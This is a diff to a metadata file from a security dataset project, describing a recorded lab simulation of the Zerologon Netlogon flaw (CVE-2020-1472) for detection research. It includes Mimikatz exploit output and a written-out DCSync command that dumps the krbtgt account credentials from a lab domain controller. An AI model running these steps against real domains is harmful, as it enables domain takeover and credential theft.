@@ -1,24 +1,26 @@
-title: Password Update via Netlogon Insecure AES-CFB8
+title: Mimikatz Netlogon Unauthenticated NetrServerAuthenticate2
 id: SDWIN-200916232559
 author: Roberto Rodriguez @Cyb3rWard0g
 creation_date: 2020/09/16
 modification_date: 2020/09/16
 platform: Windows
+tags:
+  - CVE-2020-1472
+  - Password Update
+  - Netlogon Insecure AES-CFB8
 description: This dataset represents adversaries leveraging a vulnerability (CVE-2020-1472) in a cryptographic authentication scheme used by the Netlogon Remote Protocol, which among other things can be used to update computer passwords. This vulnerability was discovered by [@@SecuraBV](https://twitter.com/SecuraBV).
-dataset:
-  - type: Host
-    link:
-      - https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/host/mimikatz_CVE-2020-1472_NetrServerAuthenticate2.zip
-  - type: Network
-    link:
-      - https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/network/mimikatz_CVE-2020-1472_NetrServerAuthenticate2.zip
 attack_mappings:
   - technique: T1210
     sub-technique:
     tactics:
       - TA0008
 notebooks:
-simulator:
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/host/mimikatz_CVE-2020-1472_NetrServerAuthenticate2.zip
+- type: Network
+  link: https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/network/mimikatz_CVE-2020-1472_NetrServerAuthenticate2.zip
+simulation:
   environment: Mordor shire
   tools:
     - type: C2
@@ -57,7 +59,7 @@ simulator:
     Mode   : exploit
 
     Trying to 'authenticate'...
-    ============================================================================================================================================================================================================================================================================================================================================================================================================================================================
+    ====================================================
 
     NetrServerAuthenticate2: 0x00000000
     NetrServerPasswordSet2 : 0x00000000
@@ -71,8 +73,6 @@ simulator:
 
     DCSync Follow-up (Optional)
     (wardog) > ShellCmd /shellcommand:"C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe \"lsadump::dcsync /domain:theshire.local /dc:MORDORDC.theshire.local /user:krbtgt /authuser:MORDORDC$ /authdomain:theshire /authpassword:\\"\\" /authntlm\" exit"
-    
-
 references:
   - https://www.secura.com/blog/zero-logon
   - https://www.secura.com/pathtoimg.php?id=2055
